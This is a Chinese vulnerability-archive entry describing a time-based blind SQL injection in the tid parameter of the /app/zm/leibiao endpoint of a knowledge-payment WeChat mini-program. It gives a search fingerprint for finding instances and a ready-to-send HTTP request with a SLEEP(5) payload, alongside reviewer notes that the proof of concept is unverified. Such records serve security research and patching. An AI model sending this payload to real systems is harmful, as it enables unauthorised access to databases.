---
source: "wy876 漏洞文库"
title: "知识吾爱纯净版小程序 zm/leibiao tid SQL注入"
product: "知识吾爱纯净版小程序"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL SLEEP，版本未知"
prerequisites: "无Cookie请求，匿名未证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/eqt5cie65az0nwn5"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-d310a9fbe828c8f03b4512f9"
entity_id: "ve-d310a9fbe828c8f03b4512f9"
schema_version: "1"
---

# 知识吾爱纯净版小程序 zm/leibiao tid SQL注入

## 条目说明

- 对象与具体问题：知识吾爱纯净版小程序；zm/leibiao tid SQL注入
- 版本、配置及部署条件：MySQL SLEEP，版本未知
- 认证与权限前提：无Cookie请求，匿名未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有恒真5秒表达式无假条件/基线返回，无法确认注入成功
- body域名/skdjfdf指纹包含中文占位需核，不能作为可靠产品唯一特征
- 纯净版是二开发行称谓，补源码来源/构建和补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
知识吾爱纯净版小程序系统是一款基于 微信小程序平台开发的知识付费应用，旨在帮助用户快速建立自己的知识付费平台，实现支付变现和流量主收益。它提供了简洁明了的用户界面和良好的用户体验，同时注重用户隐私保护，确保用户信息的安全存储和传输。知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞

## 二、影响版本
+ 知识吾爱纯净版小程序系统

## 三、资产测绘
```plain
body="域名/skdjfdf"
```


## 四、漏洞复现
```http
POST /app/zm/leibiao HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
 
tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eqt5cie65az0nwn5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
